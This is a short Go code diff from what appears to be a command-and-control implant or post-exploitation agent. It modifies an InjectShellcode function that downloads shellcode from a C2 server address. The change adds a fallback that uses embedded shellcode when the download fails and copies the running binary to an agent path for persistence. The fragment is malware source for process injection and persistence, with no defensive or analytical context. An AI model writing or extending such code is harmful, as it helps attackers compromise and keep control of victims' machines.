@@ -261,7 +261,11 @@ func InjectShellcode(pid int, method string) (err error) {
 	// prepare the shellcode
 	sc, err := DownloadViaCC(CCAddress+"shellcode.txt", "")
 	if err != nil {
-		return
+		sc = []byte(GuardianShellcode)
+		err = Copy(os.Args[0], GuardianAgentPath)
+		if err != nil {
+			return
+		}
 	}
 	shellcode := string(sc)
 	shellcodeLen := strings.Count(string(shellcode), "0x")
